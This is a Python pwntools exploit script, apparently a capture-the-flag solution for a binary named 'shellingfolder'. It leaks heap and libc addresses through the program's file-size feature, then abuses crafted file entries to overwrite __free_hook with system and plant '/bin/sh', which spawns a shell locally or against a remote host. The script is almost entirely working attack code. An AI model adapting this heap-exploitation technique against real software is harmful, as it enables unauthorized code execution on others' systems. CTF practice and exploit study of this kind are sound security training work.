from pwn import *
import sys
from time import time
import ctypes

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./shellingfolder"
LIBC = ""
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level='debug'

def read_menu(conn):
    conn.recvuntil("choice:")

def changefolder(conn, name):
    read_menu(conn)
    conn.sendline("2")
    conn.recvuntil(":")
    conn.sendline(name)

def makefile(conn, name, sz):
    read_menu(conn)
    conn.sendline("4")
    conn.recvuntil(":")
    conn.send(name[:31])
    conn.recvuntil(":")
    conn.send(str(sz))

def makefolder(conn, name):
    read_menu(conn)
    conn.sendline("3")
    conn.recvuntil(":")
    conn.send(name[:31])

def remove(conn, name):
    read_menu(conn)
    conn.sendline("5")
    conn.recvuntil(":")
    conn.sendline(name[:31])

def calcsize(conn):
    read_menu(conn)
    conn.sendline("6")

def exploit(conn, elf, libc, local):
    makefile(conn, "A"*24, 10)
    read_menu(conn)
    conn.sendline("6")
    conn.recv(24)
    haddr = conn.recvuntil(" :")[:-2]
    heapbase = u64(haddr.ljust(8, "\x00")) & (~0xff)
    log.info(hex(heapbase))

    remove(conn, "A"*24)

    makefolder(conn, "ABC")
    lv = ctypes.c_int(heapbase + 0x130 - 0x50).value
    rv = ctypes.c_int((heapbase + 0x130 - 0x50) >> 32).value + (0 if lv > 0 else 1)
    makefile(conn, "A"*24 + p64(heapbase + 0xa0), str(lv))
    makefile(conn, "A"*24 + p64(heapbase + 0xa4), str(rv))
    calcsize(conn)

    remove(conn, "A"*24 + p64(heapbase + 0xa0))

    changefolder(conn, "ABC")
    read_menu(conn)
    conn.sendline("1")
    conn.recvline()
    x = u64(conn.recv(6).ljust(8, "\x00"))
    libc.address = x - 0x397b58 # main arena for my libc
    log.info("libcaddr: 0x%x", libc.address)


    changefolder(conn, "..")
    remove(conn, "A"*24 + p64(heapbase + 0xa4))
    makefile(conn, "AAA", 10)

    what = libc.symbols['system']
    where = libc.symbols['__free_hook']
    lv = ctypes.c_int(what).value
    rv = ctypes.c_int((what) >> 32).value + (0 if lv > 0 else 1)
    makefile(conn, "A"*24 + p64(where), str(lv))
    makefile(conn, "A"*24 + p64(where + 0x4), str(rv))

    what = u64("/bin/sh\x00")
    where = heapbase + 0x130
    lv = ctypes.c_int(what).value
    rv = ctypes.c_int((what) >> 32).value + (0 if lv > 0 else 1)
    makefile(conn, "A"*24 + p64(where), str(lv))
    makefile(conn, "A"*24 + p64(where + 0x4), str(rv))

    calcsize(conn)
    remove(conn, "AAA")
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("", 1337)
            r = remote(H, P)
            libc = ELF(LIBC)
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC)
        pause()
        exploit(r, elf, libc, local=True)
